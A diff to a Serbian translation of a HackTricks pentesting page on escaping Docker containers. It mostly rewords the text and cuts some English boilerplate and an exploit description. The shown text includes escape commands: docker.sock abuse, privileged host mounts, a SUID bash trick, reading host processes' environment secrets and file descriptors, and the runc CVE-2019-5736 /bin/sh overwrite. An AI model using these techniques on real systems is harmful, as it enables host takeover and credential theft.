@@ -6,7 +6,7 @@
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJE**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
@@ -14,7 +14,7 @@ Drugi načini podrške HackTricks-u:
 
 </details>
 
-<figure><img src="../../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
 Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice.\
@@ -30,10 +30,10 @@ Pristupite danas:
 * [**deepce**](https://github.com/stealthcopter/deepce): Alat za nabrojavanje i bekstvo iz kontejnera
 * [**grype**](https://github.com/anchore/grype): Dobijanje CVE-ova koji se nalaze u softveru instaliranom na slici
 
-## Bekstvo Montiranog Docker Socketa
+## Bekstvo iz Montiranog Docker Socketa
 
 Ako na neki način otkrijete da je **docker socket montiran** unutar docker kontejnera, moći ćete da pobegnete iz njega.\
-Ovo se obično dešava u docker kontejnerima koji iz nekog razloga moraju da se povežu sa docker daemonom kako bi obavili akcije.
+Ovo se obično dešava u docker kontejnerima koji iz nekog razloga moraju da se povežu sa docker demonom kako bi obavili akcije.
 ```bash
 #Search the socket
 find / -name docker.sock 2>/dev/null
@@ -57,10 +57,10 @@ docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --se
 U slučaju da je **docker socket na neočekivanom mestu** i dalje možete komunicirati s njim koristeći **`docker`** komandu sa parametrom **`-H unix:///putanja/do/docker.sock`**
 {% endhint %}
 
-Docker daemon može takođe [slušati na portu (podrazumevano 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) ili na Systemd baziranim sistemima, komunikacija sa Docker daemonom može se odvijati preko Systemd socketa `fd://`.
+Docker daemon takođe može [slušati na portu (podrazumevano 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) ili na Systemd baziranim sistemima, komunikacija sa Docker daemonom može se odvijati preko Systemd socketa `fd://`.
 
 {% hint style="info" %}
-Dodatno, obratite pažnju na runtime sockete drugih visokonivnih runtime-ova:
+Dodatno, obratite pažnju na runtime socketa drugih visokonivnih runtime-ova:
 
 * dockershim: `unix:///var/run/dockershim.sock`
 * containerd: `unix:///run/containerd/containerd.sock`
@@ -70,9 +70,9 @@ Dodatno, obratite pažnju na runtime sockete drugih visokonivnih runtime-ova:
 * ...
 {% endhint %}
 
-## Zloupotreba sposobnosti za bekstvo
+## Bekstvo zloupotrebe sposobnosti
 
-Treba proveriti sposobnosti kontejnera, ako ima bilo koju od sledećih, možda ćete moći da pobegnete iz njega: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**
+Treba da proverite sposobnosti kontejnera, ako ima bilo koju od sledećih, možda ćete moći da pobegnete iz njega: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**
 
 Trenutne sposobnosti kontejnera možete proveriti koristeći **prethodno pomenute automatske alate** ili:
 ```bash
@@ -84,7 +84,7 @@ Na sledećoj stranici možete **saznati više o linux sposobnostima** i kako ih 
 [linux-capabilities.md](../../linux-capabilities.md)
 {% endcontent-ref %}
 
-## Bekstvo iz Privilegovanih Kontejnera
+## Bekstvo iz privilegovanih kontejnera
 
 Privilegovani kontejner može biti kreiran sa zastavicom `--privileged` ili onemogućavanjem specifičnih odbrana:
 
@@ -112,7 +112,7 @@ Testirajte to u kontejneru izvršavanjem:
 ```bash
 docker run --rm -it --pid=host --privileged ubuntu bash
 ```
-### Privilegovani
+### Privilegovan
 
 Samo sa privilegovanom zastavicom možete pokušati **pristupiti disku domaćina** ili pokušati **izbeći zloupotrebu release\_agent-a ili drugih bekstava**.
 
@@ -194,7 +194,7 @@ cat /o
 ```
 {% endcode %}
 
-#### Privilegovano bekstvo zloupotrebom kreiranog release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
+#### Privilegovano bežanje zloupotrebom kreiranog release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
 
 {% code title="Drugi PoC" %}
 ```bash
@@ -248,7 +248,7 @@ Pronađite **objašnjenje tehnike** u:
 
 #### Privilegovano bežanje zloupotrebom release\_agent-a bez poznavanja relativne putanje - PoC3
 
-U prethodnim eksploatacijama **otkrivena je apsolutna putanja kontejnera unutar datotečnog sistema domaćina**. Međutim, to nije uvek slučaj. U situacijama kada **ne znate apsolutnu putanju kontejnera unutar domaćina**, možete koristiti ovu tehniku:
+U prethodnim eksploatacijama **je otkrivena apsolutna putanja kontejnera unutar fajl sistema domaćina**. Međutim, to nije uvek slučaj. U situacijama kada **ne znate apsolutnu putanju kontejnera unutar domaćina** možete koristiti ovu tehniku:
 
 {% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
 [release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
@@ -340,9 +340,9 @@ root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
 root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 ...
 ```
-#### Zloupotreba Osetljivih Montaža za Eskalaciju Ovlašćenja
+#### Zloupotreba privilegija kroz osetljive montaže
 
-Postoje nekoliko datoteka koje mogu biti montirane koje pružaju **informacije o osnovnom hostu**. Neke od njih čak mogu ukazivati na **nešto što će biti izvršeno od strane hosta kada se nešto desi** (što će omogućiti napadaču da pobegne iz kontejnera).\
+Postoje nekoliko datoteka koje mogu biti montirane i koje pružaju **informacije o osnovnom hostu**. Neke od njih čak mogu ukazivati na **nešto što će biti izvršeno od strane hosta kada se nešto desi** (što će omogućiti napadaču da pobegne iz kontejnera).\
 Zloupotreba ovih datoteka može omogućiti:
 
 * release\_agent (već obrađeno ranije)
@@ -357,15 +357,15 @@ Međutim, možete pronaći **druge osetljive datoteke** koje treba proveriti na 
 [sensitive-mounts.md](sensitive-mounts.md)
 {% endcontent-ref %}
 
-### Proizvoljne Montaže
+### Proizvoljne montaže
 
-U nekoliko prilika ćete primetiti da je **kontejner montirao neki volumen sa hosta**. Ako ovaj volumen nije pravilno konfigurisan, možda ćete moći da **pristupite/izmenite osetljive podatke**: Čitanje tajni, menjanje ssh authorized\_keys…
+U nekoliko prilika ćete primetiti da je **kontejner montirao neki volumen sa hosta**. Ako ovaj volumen nije pravilno konfigurisan, možda ćete moći da **pristupite/izmenite osetljive podatke**: Čitate tajne, menjate ssh authorized\_keys...
 ```bash
 docker run --rm -it -v /:/host ubuntu bash
 ```
 ### Eskalacija privilegija sa 2 školjke i host montažom
 
-Ako imate pristup kao **root unutar kontejnera** koji ima neki folder sa hosta montiran i uspeli ste kao neprivilegovani korisnik da pobegnete na host i imate pristup za čitanje nad montiranim folderom.\
+Ako imate pristup kao **root unutar kontejnera** koji ima neki folder sa hosta montiran i uspeli ste kao neprivilegovani korisnik da pobegnete na host i imate pristup za čitanje preko montiranog foldera.\
 Možete kreirati **bash suid fajl** u **montiranom folderu** unutar **kontejnera** i **izvršiti ga sa hosta** radi eskalacije privilegija.
 ```bash
 cp /bin/bash . #From non priv inside mounted folder
@@ -374,12 +374,12 @@ chown root:root bash #From container as root inside mounted folder
 chmod 4777 bash #From container as root inside mounted folder
 bash -p #From non priv inside mounted folder
 ```
-### Eskalacija privilegija sa 2 školjke
+### Eskalacija privilegija sa 2 ljuske
 
-Ako imate pristup kao **root unutar kontejnera** i uspeli ste kao **neprivilegovani korisnik da pobegnete na host**, možete zloupotrebiti obe školjke da biste **eskaliirali privilegije unutar hosta** ako imate mogućnost MKNOD unutar kontejnera (to je podrazumevano) kao što je [**objašnjeno u ovom postu**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
-Sa takvom mogućnošću, korisnik root unutar kontejnera ima dozvolu da **kreira blok uređajne datoteke**. Uređajne datoteke su posebne datoteke koje se koriste za **pristupanje osnovnom hardveru i jezgrovim modulima**. Na primer, blok uređajna datoteka /dev/sda omogućava pristup **čitanju sirovih podataka na sistemu diska**.
+Ako imate pristup kao **root unutar kontejnera** i uspeli ste kao **neprivilegovani korisnik da pobegnete na host**, možete zloupotrebiti obe ljuske da biste **eskaliirali privilegije unutar hosta** ako imate mogućnost MKNOD unutar kontejnera (to je podrazumevano) kao što je [**objašnjeno u ovom postu**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
+Sa takvom mogućnošću, korisnik root unutar kontejnera može **kreirati blok uređajne datoteke**. Uređajne datoteke su posebne datoteke koje se koriste za **pristupanje osnovnom hardveru i jezgrovim modulima**. Na primer, blok uređajna datoteka /dev/sda omogućava pristup **čitanju sirovih podataka na sistemskom disku**.
 
-Docker štiti od zloupotrebe blok uređajnih datoteka unutar kontejnera primenom cgroup politike koja **blokira operacije čitanja/pisanja blok uređajnih datoteka**. Ipak, ako se blok uređajna datoteka **kreira unutar kontejnera**, postaje dostupna spoljašnjem svetu putem direktorijuma **/proc/PID/root/**. Za ovaj pristup je potrebno da **vlasnik procesa bude isti** i unutar i izvan kontejnera.
+Docker štiti od zloupotrebe blok uređajnih datoteka unutar kontejnera sprovođenjem cgroup politike koja **blokira operacije čitanja/pisanja blok uređajnih datoteka**. Ipak, ako se blok uređajna datoteka **kreira unutar kontejnera**, postaje dostupna spoljašnjem svetu putem direktorijuma **/proc/PID/root/**. Za ovaj pristup je potrebno da **vlasnik procesa bude isti** i unutar i izvan kontejnera.
 
 Primer **eksploatacije** iz ovog [**izveštaja**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
 ```bash
@@ -423,7 +423,7 @@ Ako možete pristupiti procesima domaćina, bićete u mogućnosti da pristupite 
 ```
 docker run --rm -it --pid=host ubuntu bash
 ```
-Na primer, moći ćete da izlistate procese koristeći nešto poput `ps auxn` i tražite osetljive detalje u komandama.
+Na primer, bićete u mogućnosti da izlistate procese koristeći nešto poput `ps auxn` i tražite osetljive detalje u komandama.
 
 Zatim, kako možete **pristupiti svakom procesu domaćina u /proc/, možete jednostavno ukrasti njihove tajne okoline** pokretanjem:
 ```bash
@@ -434,7 +434,7 @@ HOSTNAME=argocd-server-69678b4f65-6mmql
 USER=abrgocd
 ...
 ```
-Takođe možete **pristupiti fajl deskriptorima drugih procesa i pročitati njihove otvorene fajlove**:
+Možete takođe **pristupiti fajl deskriptorima drugih procesa i pročitati njihove otvorene fajlove**:
 ```bash
 for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
 less fds.txt
@@ -444,32 +444,32 @@ lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
 # You can open the secret filw with:
 cat /proc/635813/fd/4
 ```
-Takođe možete **ubiti procese i izazvati DoS**.
+Možete takođe **ubiti procese i izazvati DoS**.
 
 {% hint style="warning" %}
-Ako na neki način imate privilegovan **pristup procesu van kontejnera**, možete pokrenuti nešto poput `nsenter --target <pid> --all` ili `nsenter --target <pid> --mount --net --pid --cgroup` da **pokrenete shell sa istim ns ograničenjima** (nadam se nijednim) **kao taj proces.**
+Ako na neki način imate privilegovan **pristup procesu van kontejnera**, možete pokrenuti nešto poput `nsenter --target <pid> --all` ili `nsenter --target <pid> --mount --net --pid --cgroup` da **pokrenete shell sa istim ns ograničenjima** (nadam se da nema) **kao taj proces.**
 {% endhint %}
 
 ### hostNetwork
 ```
 docker run --rm -it --network=host ubuntu bash
 ```
-Ako je kontejner konfigurisan sa Docker [host mrežnim drajverom (`--network=host`)](https://docs.docker.com/network/host/), mrežni skup tog kontejnera nije izolovan od Docker hosta (kontejner deli mrežni prostor hosta), i kontejner ne dobija dodeljenu svoju IP adresu. Drugim rečima, **kontejner povezuje sve usluge direktno na IP hosta**. Osim toga, kontejner može **interceptovati SAV mrežni saobraćaj koji host** šalje i prima na deljenoj interfejsu `tcpdump -i eth0`.
+Ako je kontejner konfigurisan sa Docker [host mrežnim drajverom (`--network=host`)](https://docs.docker.com/network/host/), mrežni skup tog kontejnera nije izolovan od Docker hosta (kontejner deli mrežni prostor hosta), i kontejner ne dobija dodeljenu svoju IP adresu. Drugim rečima, **kontejner povezuje sve servise direktno na IP hosta**. Osim toga, kontejner može **interceptovati SAV mrežni saobraćaj koji host** šalje i prima na deljenom interfejsu `tcpdump -i eth0`.
 
-Na primer, možete koristiti ovo da **snifujete čak i lažirate saobraćaj** između hosta i instance metapodataka.
+Na primer, možete koristiti ovo da **snifujete čak i falsifikujete saobraćaj** između hosta i instance metapodataka.
 
 Kao u sledećim primerima:
 
 * [Analiza: Kako kontaktirati Google SRE: Ubacivanje shell-a u cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
 * [MITM servis metapodataka omogućava eskalaciju privilegija na root nivo (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)
 
-Takođe ćete moći da pristupite **mrežnim uslugama povezanim na localhost** unutar hosta ili čak pristupite **dozvolama metapodataka čvora** (koje mogu biti različite od onih do kojih kontejner može da pristupi).
+Takođe ćete moći da pristupite **mrežnim servisima povezanim na localhost** unutar hosta ili čak pristupite **dozvolama metapodataka čvora** (koje mogu biti različite od onih do kojih kontejner može da pristupi).
 
 ### hostIPC
 ```bash
 docker run --rm -it --ipc=host ubuntu bash
 ```
-Sa `hostIPC=true`, dobijate pristup resursima međuprocesne komunikacije (IPC) domaćina, poput **deljene memorije** u `/dev/shm`. Ovo omogućava čitanje/pisanje gde se isti IPC resursi koriste od strane drugih procesa domaćina ili podova. Koristite `ipcs` da detaljnije pregledate ove IPC mehanizme.
+Sa `hostIPC=true`, dobijate pristup resursima međuprocesne komunikacije (IPC) domaćina, kao što su **deljena memorija** u `/dev/shm`. Ovo omogućava čitanje/pisanje gde se isti IPC resursi koriste od strane drugih procesa domaćina ili podova. Koristite `ipcs` da detaljnije pregledate ove IPC mehanizme.
 
 * **Pregledajte /dev/shm** - Potražite datoteke na ovoj lokaciji deljene memorije: `ls -la /dev/shm`
 * **Pregled postojećih IPC objekata** - Možete proveriti da li se koriste neki IPC objekti sa `/usr/bin/ipcs`. Proverite sa: `ipcs -a`
@@ -484,9 +484,9 @@ cat /proc/self/status | grep CapEff
 ```
 ### Zloupotreba korisničkog prostora putem simboličkih veza
 
-Druga tehnika objašnjena u postu [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) pokazuje kako možete zloupotrebiti bind mount-ove sa korisničkim prostorima, kako biste uticali na datoteke unutar domaćina (u tom specifičnom slučaju, brisanje datoteka).
+Druga tehnika objašnjena u postu [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) pokazuje kako možete zloupotrebiti bind montaže sa korisničkim prostorima da biste uticali na datoteke unutar domaćina (u tom specifičnom slučaju, brisanje datoteka).
 
-<figure><img src="../../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
 Pristupite danas:
@@ -497,14 +497,14 @@ Pristupite danas:
 
 ### Runc eksploatacija (CVE-2019-5736)
 
-U slučaju da možete izvršiti `docker exec` kao root (verovatno sa sudo), možete pokušati da eskalirate privilegije bežeći iz kontejnera zloupotrebom CVE-2019-5736 (eksploatacija [ovde](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Ova tehnika će u osnovi **prepisati** binarni fajl _**/bin/sh**_ domaćina **iz kontejnera**, tako da bilo ko ko izvrši docker exec može pokrenuti payload.
+U slučaju da možete izvršiti `docker exec` kao root (verovatno sa sudo), možete pokušati da eskalirate privilegije bežeći iz kontejnera zloupotrebom CVE-2019-5736 (eksploatacija [ovde](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Ova tehnika će u osnovi **prepisati** binarnu datoteku _**/bin/sh**_ **domaćina** **iz kontejnera**, tako da bilo ko ko izvrši docker exec može pokrenuti payload.
 
-Promenite payload prema potrebi i izgradite main.go sa `go build main.go`. Rezultujući binarni fajl treba da bude smešten u docker kontejner radi izvršenja.\
-Prilikom izvršenja, čim prikaže `[+] Overwritten /bin/sh successfully` treba da izvršite sledeće sa mašine domaćina:
+Promenite payload prema potrebi i izgradite main.go sa `go build main.go`. Rezultujuća binarna datoteka treba da bude smeštena u docker kontejner radi izvršenja.\
+Prilikom izvršenja, čim prikaže `[+] Overwritten /bin/sh successfully` treba da izvršite sledeće sa host mašine:
 
 `docker exec -it <ime-kontejnera> /bin/sh`
 
-Ovo će pokrenuti payload koji se nalazi u fajlu main.go.
+Ovo će pokrenuti payload koji se nalazi u datoteci main.go.
 
 Za više informacija: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
 
@@ -549,37 +549,26 @@ Postoje i drugi CVE-ovi na koje kontejner može biti ranjiv, možete pronaći li
 
 ## Docker Breakout Privilege Escalation
 
-### Description
+### Overview
 
-This repository contains a collection of techniques and tools to perform privilege escalation in Docker containers and break out to the host system.
-
-### Techniques
-
-1. **Mounting the Docker socket**: By mounting the Docker socket inside a container, an attacker can interact with the Docker daemon and potentially gain root access on the host.
-
-2. **Exploiting Docker API**: If the Docker API is exposed without proper authentication and authorization, an attacker can send API requests to start a privileged container and gain access to the host system.
-
-3. **Abusing Docker Image Build**: By crafting a malicious Dockerfile, an attacker can execute commands during the image build process that can lead to privilege escalation.
-
-### Tools
-
-1. **Docker Escaper**: A tool that automates the process of mounting the Docker socket inside a container and provides a shell on the host system.
-
-2. **DockerPwn.py**: A Python script that exploits the Docker API to create a privileged container and gain access to the host.
-
-3. **Dockerfile-Attack**: A collection of Dockerfiles with malicious commands to demonstrate privilege escalation during image builds.
+Docker containers are designed to run as isolated environments, but there are ways to break out of a container and escalate privileges on the host system. This can be achieved through various techniques such as mounting the host filesystem, exploiting Docker API, or abusing kernel vulnerabilities.
 
 ### Mitigation
 
 To prevent Docker breakout privilege escalation, follow these best practices:
 
-- Avoid mounting the Docker socket inside containers.
-- Secure the Docker API with proper authentication and authorization.
-- Use official and trusted Docker images to minimize the risk of malicious Dockerfiles.
+1. **Use minimal base images**: Start with minimal base images to reduce the attack surface.
+2. **Limit container capabilities**: Use the `--cap-drop` and `--cap-add` flags to restrict container capabilities.
+3. **Restrict host mounts**: Avoid mounting sensitive host directories into containers.
+4. **Monitor Docker API**: Monitor and restrict access to the Docker API to prevent unauthorized actions.
+5. **Keep Docker up to date**: Regularly update Docker to patch known vulnerabilities.
 
-### Disclaimer
+By following these practices, you can enhance the security of your Docker containers and reduce the risk of privilege escalation attacks.
 
-This repository is for educational purposes only. The techniques and tools should only be used in authorized penetration testing engagements or for educational purposes.
+### References
+
+- [Docker Security](https://docs.docker.com/engine/security/)
+- [Docker Security Best Practices](https://cloudberry.engineering/article/docker-security-best-practices/)
 
 {% endtab %}
 ```
@@ -601,35 +590,7 @@ This repository is for educational purposes only. The techniques and tools shoul
 ```
 {% endtab %}
 
-{% tab title="syscall_bf.c" %} 
-
-## Docker Breakout Privilege Escalation
-
-Ovaj exploit koristi `CAP_SYS_ADMIN` capability da bi se izvršio `mknod` syscall i kreirao `setuid` binary unutar Docker kontejnera. Zatim se koristi `CAP_SETUID` capability da bi se postavila `setuid` permisija na novokreiranom binary fajlu. Konačno, exploit koristi `setuid(0)` syscall da bi se pokrenuo shell sa root privilegijama.
-
-### Kompajliranje
-
-```bash
-gcc -o syscall_bf syscall_bf.c
-```
-
-### Korišćenje
-
-```bash
-./syscall_bf
-```
-
-### Primer izvršavanja
-
-```bash
-$ id
-uid=1000 gid=1000 groups=1000
-$ ./syscall_bf
-$ id
-uid=0(root) gid=0(root) groups=0(root)
-```
-
-{% endtab %}
+{% tab title="syscall_bf.c" %}
 ````c
 // From a conversation I had with @arget131
 // Fir bfing syscalss in x64
@@ -693,7 +654,7 @@ If you are in **userspace** (**no kernel exploit** involved) the way to find new
 * [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
 * [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)
 
-<figure><img src="../../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
 Get Access Today:
